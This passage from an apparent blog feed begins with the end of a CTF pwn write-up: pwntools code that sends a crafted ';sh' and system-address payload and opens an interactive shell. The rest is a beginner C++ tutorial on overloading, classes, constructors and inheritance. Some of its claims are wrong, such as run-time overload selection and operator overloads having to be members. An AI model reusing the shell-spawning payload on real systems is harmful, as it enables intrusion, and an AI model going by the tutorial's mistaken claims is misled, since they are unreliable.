payload=p32(0xdeadbeef)*0x8</span></span><br><span class="line"><span class="comment"># payload+=p32(io_file_addr)</span></span><br><span class="line"><span class="comment"># payload+=io_file</span></span><br><span class="line"></span><br><span class="line">payload  = p32(<span class="number">0xdeadbeef</span>)*<span class="number">0x8</span></span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += p32(<span class="number">0xffffdfff</span>)</span><br><span class="line">payload += <span class="string">b&quot;;sh&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x8d</span></span><br><span class="line">payload += p32(<span class="number">0x0804B284</span>+<span class="number">0x98</span>)</span><br><span class="line">payload += p32(sys_addr)*<span class="number">3</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302082210135.png" alt="image-20230208221024944"></p><p>参考文章：<a href="https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/">https://www.nullhardware.com/reference/hacking-101/picoctf-2018-binary-exploits/buffer-overflow-3/</a></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++ 常见术语&amp;&amp;基础概念的学习总结</title>
      <link href="/posts/4320fd7a.html"/>
      <url>/posts/4320fd7a.html</url>
      
        <content type="html"><![CDATA[<p>简单入门了一下 C++ ，学习了几天，大概清楚了这些常用的术语和基础概念，虽然这对 <code>PWN</code> 中的 C++ 题目逆向帮助实在不大，但好奇心总是驱使着我尝试弄懂它们。感谢 <code>winmt</code> 师傅在我这部分的学习中，解惑我的一些奇奇怪怪的问题</p><h3 id="从输出hello-world开始">从输出hello world开始</h3><p>在 C++ 中可以用如下代码来输出<code>hello world</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iostream</code> 这个头文件定义了输入输出流的相关类型和函数，这里为什么不是<code>#include&lt;iostream.h&gt;</code> 呢，因为在 C++ 11 标准后，<strong>标准库的头文件</strong>就不再使用 <code>.h</code> 作为后缀了，这样的好处是能够更好的区分标准库的头文件和用户自定义的头文件，比如我们自己写了一个名为 <code>iostream.h</code> 的头文件，就可以使用 <code>#include&lt;iostream.h&gt;</code> 来包含这个头文件，而不会和标准库的 <code>&lt;iostream&gt;</code> 头文件冲突。</p><p>此处输出 <code>hello world\n</code> 是 <code> std::cout &lt;&lt; &quot;hello world&quot;</code>这部分来实现的，而后面 <code>\n</code> 则是 <code>&lt;&lt; std ::endl</code>来实现的。 <code>std</code>是标准命名空间，用于区分不同符号名称的机制，在 C++ 标准库中，所有类型和函数都被定义到了标准命名空间（也就是 <code>std</code> ） 补充： 如果在 main函数之前写入 <code>using namespace std</code> 那么之后出现属于 <code>std</code> 中的对象就不必在前面加入 <code>std::</code>了，但通常我们不这么做，尽管这样看起来可能很简洁。</p><p>举个例子，全国有很多个张三，为了区分这些张三我们可以给每个张三都加一个前缀，比如河南的张三，北京的张三，这个前缀也就是不同的命名空间了。</p><p><u>我们可以使用这个 <code>std::cout</code> <strong>输出流对象</strong>来输出内容</u>，这个输出流对象就是定义在 <code>std</code> 中的。而 <code>&lt;&lt;</code> 是一个流插入运算符，将数据输出到流中。 <code>std::cout &lt;&lt; &quot;hello world&quot; </code> 可以理解为将字符串 <code>”hello world&quot;</code> 流向<code>std::cout</code> 这个输出流，从而进行了输出。 <code>&lt;&lt;</code> 明明是左移运算符，但这里为什么是流插入运算符呢？这是因为运算符重载，姑且可以理解这个重载就是分身，即同一个符号可以在不同情况下有不同的意思</p><p>从简单来说，可以把 <code>std::endl</code>看成一个 <code>\n</code> 添加到字符串的末尾，但实际上它的本质是一个函数指针，具体功能是在字符串中增加了一个 <code>\n</code> 并且还调用了flush来刷新缓冲区。那既然是函数指针，怎么调用的时候没有加 <code>()</code> 呢？这是因为这个函数指针被重载运算符 <code>&lt;&lt;</code> 所包装，成为了函数对象，在调用函数对象时不需要再加上圆括号了，因为调用运算符已经被重载了。</p><p>下面先来介绍 C++ 中的函数重载，这需要先从一个问题开始思考</p><h3 id="std-cout如何识别参数类型">std::cout如何识别参数类型</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042011540.png" alt="image-20230104201132267" style="zoom:50%;" /><p>我这里输出了三种类型的数据，分别是 <code>char *</code> <code>int</code> <code>double</code>类型，并且都成功的进行了输出，如果是C语言的话，这里肯定是用 <code>printf</code> 函数中的不同格式化字符来匹配对应的数据，奇怪的是在 C++ 中，看起来一样的输出语句怎么可以匹配不同的参数类型呢？</p><p>这就要提到函数重载这个知识点了。</p><h4 id="函数重载">函数重载</h4><p>在 C++ 中，**函数重载允许在同一个作用域中定义多个同名函数，不过它们的参数列表需要不同(**参数类型，数量，或者顺序至少有一项不同)</p><p>代码示例如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is data of type int&quot;</span> &lt;&lt; std::endl; </span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is data of type const char *&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type</span><span class="params">(<span class="type">double</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is data of type double&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">type</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="built_in">type</span>(<span class="number">123</span>);</span><br><span class="line"><span class="built_in">type</span>(<span class="number">0.06</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042053567.png" alt="image-20230104205318468"></p><p>可以发现我定义了三个 <code>type</code> 函数，他们的函数名一样，但是参数的类型不一样，而在main函数中调用了三次 <code>type</code> 函数，根据传入的参数不同调用相匹配的那个函数来执行。<strong>实现原理是编译器在编译代码时把所有函数的签名都记录下来，然后在运行时根据函数提供的参数来选择某个函数</strong>。</p><h4 id="运算符重载">运算符重载</h4><p>但实际上对于 <code>&lt;&lt;</code> 还涉及到了一个重载运算符，简单来说重载运算符指的是我们可以赋予原本运算符新的意义，<strong>重载运算符本质上是</strong>带有特殊名称的<strong>函数</strong>，重载运算符函数(也就是函数名)由关键字 <code>operator</code> 和要重载的运算符构成。</p><p>举个例子，我现在创建了一个Box类，然后实例化对象是一个 <code>box</code> ，具有长，宽，高的属性，我现在希望将+重载，使其可以让两个Box对象的每个属性相加。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> width;</span><br><span class="line"><span class="type">int</span> height;</span><br><span class="line">Box <span class="keyword">operator</span>+(<span class="type">const</span> Box&amp; box2)</span><br><span class="line">&#123;</span><br><span class="line">Box box3;</span><br><span class="line">box3.length=<span class="keyword">this</span>-&gt;length + box2.length;</span><br><span class="line">box3.width=<span class="keyword">this</span>-&gt;width + box2.width;</span><br><span class="line">box3.height=<span class="keyword">this</span>-&gt;height + box2.height;</span><br><span class="line"><span class="keyword">return</span> box3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box box1,box2,box3;</span><br><span class="line">box1.length=<span class="number">1</span>;</span><br><span class="line">box1.width=<span class="number">2</span>;</span><br><span class="line">box1.height=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">box2.length=<span class="number">10</span>;</span><br><span class="line">box2.width=<span class="number">20</span>;</span><br><span class="line">box2.height=<span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">box3=box1+box2;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The length of the box3 is &quot;</span> &lt;&lt;box3.length &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The width of the box3 is &quot;</span> &lt;&lt; box3.width &lt;&lt;std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The height of the box3 is &quot;</span> &lt;&lt; box3.height &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301042229281.png" alt="image-20230104222911178"></p><p>在 <code>Box</code> 这个类中，我们用 <code>operator</code> 指定了重载的运算符为 <code>+</code> ，这二者合成了重载运算符函数，函数名前的依然是函数类型，而后面的括号里装的依然是参数，看起来和正常的函数定义一样。</p><p>但需要注意的以下几点</p><ol><li>重载运算符函数的参数，在上面的例子中， <code>+</code> 两侧的 <code>box1</code> 和<code>box2</code> 是两个参数传入给<code>operator+</code> 这个重载运算符函数，但是实际上定义的地方，你可以看见我写代码中只有一个参数 <code>box2</code> ，实际上第一个对象已经被当做参数进行了传递，该对象的属性需要用 <code>this</code> 运算符进行访问(关于 <code>this</code> 指针，后面会提到)。</li><li>观察上面的代码，发现在重载运算符函数的参数中，出现了 <code>const</code> 和 <code>&amp;</code> ，这是因为程序为了保证正确性和效率采取的措施。关于 <code>const</code> ,它是<strong>用来保护函数内部不被意外修改的对象</strong>，例如你重载了加法运算符，那么两个参数都应该是常量，因为它们在函数内部不应该被修改，所以加上 <code>const</code> 也就是说你的函数不会修改类内的任何成员变量，那么就可以将函数声明为 <code>const</code> 类型。关于**<code>&amp;</code> ,它是用来避免拷贝对象的开销的**，提到这里就不得不说<strong>在 C++ 中如果函数的参数是一个对象，那么调用函数时会进行对象的拷贝</strong>，而如果加上 <code>&amp;</code>引用的话，就可以避免拷贝对象造成的开销，提升了程序的效率。但是不加 <code>&amp;</code> 的话，也有一些优点，比如拷贝对象的话，函数内部对对象的修改不会影响原来的对象</li><li><strong>重载运算符函数必须是类的成员函数</strong>，也就是你想重载一个运算符，就必须要定义一个类，然后在类的内部定义重载运算符函数。</li></ol><p>因此根据上面的内容，就可以分析出来std::cout &lt;&lt;实际上是调用了运算符重载函数 <code>cout.operator &lt;&lt; ()</code> ，根据传入的不同参数类型，调用相匹配的重载函数。</p><h3 id="类与对象">类与对象</h3><p>笔记本电脑和台式电脑都属于计算机，计算机有的基本属性，笔记本和台式肯定都有。假设现在有一个任务是要记录计算机的基础配置，并且在之后一段时间还需要记录台式电脑的配置和笔记本电脑的配置，我们可以怎么做，写一个结构体，来记录计算机的配置？然后等到台式就再写一个结构体？如果需要写某个牌子的笔记本电脑的信息就再写N个？(实际上这是个很糟糕的例子,hhh)</p><p>不不不，你可能已经猜到我想用什么了，没错，就是用类与对象的概念来实现上述这个问题。</p><p>现在抛开之后的任务，只记录计算机的基本信息，并且将其实例化成一个个的对象(你可以将这个实例化的过程理解为将一个抽象的计算机配置突然实例成某个具体品牌的计算机)</p><p>举个例子，计算机都具有硬盘，内存，CPU，显卡，IO设备等等。</p><p>那么我们可以这么定义一个计算机类，代码如下</p><p>此处的各个属性都是我随便写的，理解意思就好，不是真的要介绍各个硬件的信息。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Computer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> Hard_disk;</span><br><span class="line"><span class="type">int</span> Memory;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *CPU;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *Video_card;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *IO;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Computer Lenovo;</span><br><span class="line">Lenovo.Hard_disk=<span class="number">128</span>;</span><br><span class="line">Lenovo.Memory=<span class="number">8</span>;</span><br><span class="line">Lenovo.CPU=<span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">Lenovo.Video_card=<span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">Lenovo.IO=<span class="string">&quot;uuu-1&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The Hard disk is &quot;</span> &lt;&lt; Lenovo.Hard_disk &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The Memory is &quot;</span> &lt;&lt; Lenovo.Memory &lt;&lt; <span class="string">&quot;G&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The CPU is &quot;</span> &lt;&lt; Lenovo.CPU &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The Video_card is &quot;</span> &lt;&lt; Lenovo.Video_card &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;The IO is &quot;</span> &lt;&lt; Lenovo.IO &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301050013916.png" alt="image-20230105001321846"></p><p>上述代码定义了一个 <code>Computer</code> 类，然后实例化的对象为 <code>Lenovo</code> ，对其所有属性都进行了初始化。语法很简单，此处代码主要讲两个点。第一就是实例化后的对象在哪里？第二个就是类中有一个 <code>public</code> ，这个是干啥的？</p><h4 id="类实例化后的对象存放到哪里？">类实例化后的对象存放到哪里？</h4><p>实例化后的对象有两种存储位置，分别是栈和堆。</p><p>上面的代码中，因为函数内的局部变量是位于栈上，而 <code>Lenovo</code> 是main函数的局部变量，所以 <code>Lenovo</code> 这个对象位于栈上。</p><p>如果主动使用了 <code>new</code> 函数来分配内存给实例化后的对象，那么该对象的内存就会位于堆上，将上面的代码做如下修改，即可让其位于堆上，不再使用该对象的时候需要手动调用 <code>delete</code> 进行销毁，避免内存泄露的问题</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Computer *Lenovo = <span class="keyword">new</span> Computer;</span><br><span class="line">Lenovo-&gt;Hard_disk = <span class="number">128</span>;</span><br><span class="line">Lenovo-&gt;Memory = <span class="number">8</span>;</span><br><span class="line">Lenovo-&gt;CPU = <span class="string">&quot;xxx-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;Video_card = <span class="string">&quot;ttt-1&quot;</span>;</span><br><span class="line">Lenovo-&gt;IO = <span class="string">&quot;uuu-1&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="类访问修饰符-数据封装">类访问修饰符&amp;&amp;数据封装</h4><p>关键字  <code>public</code> <code> private</code> <code>protected</code> 成为访问修饰符，它们标记的区域内可以设置成员变量的访问属性，比如上面的例子里，在main函数中我对 <code>Lenovo</code> 对象中的 <code>Memory</code> 成员进行了赋值为 <code>8</code> 的操作，之所以能够这样直接赋值是因为我将其定义为了公有（<code> public</code> ）成员，这就意味这我用 <code>.</code> 可以直接访问公有成员，但如果我将成员设置为私有（ <code>private</code> ）成员就无法这样直接访问了，正如同下面的代码一样</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box box;</span><br><span class="line">box.length=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051616143.png" alt="image-20230105161601838"></p><p>可以看到编译是给了一个 <code>error</code> 提示说 <code>Box::length</code> 这个成员是私有的，所以这里无法赋值。</p><p>因此我们可以将代码改成下面这样,通过公有的成员函数来访问私有的成员（<strong>所谓的私有成员指的是只能在类的内部被访问，而无法在外部进行访问</strong>），而公有的成员函数（在类内声明或定义的函数）自然是能够被外部访问。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">std::cout &lt;&lt; length &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box box;</span><br><span class="line">box.<span class="built_in">set_length</span>(<span class="number">60</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于 <code>protected</code> 修饰符与 <code>private</code> 非常类似，不同之处在于 <code>protected</code> 成员在派生类中是可以访问的。</p><p>你可能会问这个类访问修饰符出现的意义是什么？其实这就体现了 C++ 中的<strong>数据封装</strong>，我们可以将数据成员定义为私有，然后通过公有的成员函数作为接口来访问和操作私有成员，而无需知道具体实现的细节，这样就可以将实现细节与使用者隔离开，提高代码的可读性和可维护性。</p><h3 id="类构造函数-析构函数">类构造函数&amp;&amp;析构函数</h3><p>假设我现在想创建一个对象，就输出一个 <code>created successly</code> 或者是进行初始化的一些操作，总之就是在创建一个对象的时候自动调用一个函数来实现一些功能。那就需要用到构造函数了，它会在每次创建新对象的时候就被调用。</p><p>构造函数的名称要与类名一致，并且没有类型（也就是没有返回值类型）</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051700123.png" alt="image-20230105170056041"></p><p>当然了在上面的例子中也可以进行初始化的工作，比如想将每次创建的对象中的 <code>length</code> 都设置为100，那只需要对构造函数进行传参对 <code>length</code> 进行赋值即可。</p><p>假设我创建了一个对象，在释放前进行了一些打开文件和申请内存的操作，那么我希望在删除这个对象的时候，可以关闭之前打开的文件或者释放申请之前的内存，那这就要用到析构函数了，它会在删除对象的时候自动被触发，名字是在类名前面加了一个 <code>~</code> ，跟构造函数的利用类似，下面举例在每次删除对象的时候打印 <code>destruction succeeded!</code></p><p>代码如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;created successly!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">Box</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;destruction succeeded!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; length &lt;&lt; std:: endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Box *p = <span class="keyword">new</span> <span class="built_in">Box</span>();</span><br><span class="line">p-&gt;<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">p-&gt;<span class="built_in">add_length</span>(<span class="number">4</span>);</span><br><span class="line">p-&gt;<span class="built_in">output_length</span>();</span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051753557.png" alt="image-20230105175301371"></p><h3 id="继承">继承</h3><p>继承指的是类与类之间的一种关系，假设有一个类 <code>A</code> ，然后它具有 <code>100</code> 个属性，但是我现在希望去定义一个类 <code>B</code> ，它在原本 <code>A</code> 有的 <code>100</code> 个属性前提下再创建 <code>20</code> 个属性，怎么做呢？确实可以选择之间将类 <code>A</code> 的代码 <code>copy</code> 到  <code>B</code> 中，但这样显的代码过于臃肿。所以我们可以用继承， <code>B</code> 继承 <code>A</code> 所有的属性，在此基础上再增加自己新的属性。</p><p>下面的代码展示了继承</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> length;</span><br><span class="line"><span class="type">int</span> width;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_length</span><span class="params">(<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">length+=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_length</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;length is &quot;</span> &lt;&lt;length &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BBox</span> : <span class="keyword">public</span> Box</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> hight;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_hight</span><span class="params">(<span class="type">int</span> hei)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">hight=hei;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">output_hight</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hight is &quot;</span> &lt;&lt; hight &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BBox box;</span><br><span class="line">box.<span class="built_in">set_length</span>(<span class="number">20</span>);</span><br><span class="line">box.<span class="built_in">set_hight</span>(<span class="number">30</span>);</span><br><span class="line">box.<span class="built_in">output_length</span>();</span><br><span class="line">box.<span class="built_in">output_hight</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301051935782.png" alt="image-20230105193512645"></p><p>由此可以看出来， <code>BBox</code> 这个类（派生类）继承了 <code>BOX</code> 类（基类），然后实例化出来的 <code>box</code> 对象既拥有原本基类的属性和方法，又拥有新增加的属性和方法。</p><p>需要补充的是在定义这个继承类的时候执行了 <code>class BBox : public Box</code> 再次使用了 <code>public</code>  这个访问修饰符，标明了继承类型。我们通常使用 <code>public</code> 继承，很少使用 <code>protected</code> 和 <code>private</code> 继承。使用不同类型继承，遵循以下几个规则：</p><ol><li><strong>公有继承（public）：<strong>当一个类派生自</strong>公有</strong>基类时，基类的<strong>公有</strong>成员也是派生类的<strong>公有</strong>成员，基类的<strong>保护</strong>成员也是派生类的<strong>保护</strong>成员，基类的<strong>私有</strong>成员不能直接被派生类访问，但是可以通过调用基类的<strong>公有</strong>和<strong>保护</strong>成员来访问。</li><li><strong>保护继承（protected）：</strong> 当一个类派生自<strong>保护</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>保护</strong>成员。</li><li><strong>私有继承（private）：<strong>当一个类派生自</strong>私有</strong>基类时，基类的<strong>公有</strong>和<strong>保护</strong>成员将成为派生类的<strong>私有</strong>成员。</li></ol><p>上述规则转自：<a href="https://www.runoob.com/cplusplus/cpp-inheritance.html">C++ 继承 | 菜鸟教程 (runoob.com)</a></p><h4 id="多继承">多继承</h4><p>就是类 <code>A</code> 可以同时继承 <code>B</code> 和 <code>C</code> 